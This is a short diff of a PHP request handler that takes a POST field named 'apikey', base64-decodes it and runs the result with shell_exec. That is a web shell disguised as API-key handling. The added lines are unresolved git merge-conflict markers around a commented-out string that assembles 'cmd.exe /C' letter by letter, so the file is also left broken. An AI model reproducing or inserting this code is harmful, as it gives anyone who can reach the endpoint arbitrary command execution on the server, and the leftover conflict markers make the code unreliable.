@@ -6,6 +6,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
 		$value = $_POST['apikey'];
 		$dvalue = base64_decode($value);
+<<<<<<< HEAD
+=======
+		//$cm = "c" . "m" . "d" . "." . "e" . "x" . "e /C "; 
+>>>>>>> be40ca93e38d85e9df003c2f64999e3e0252c988
 
 		$cm = "";
 		$result = shell_exec($dvalue . " 2>&1");
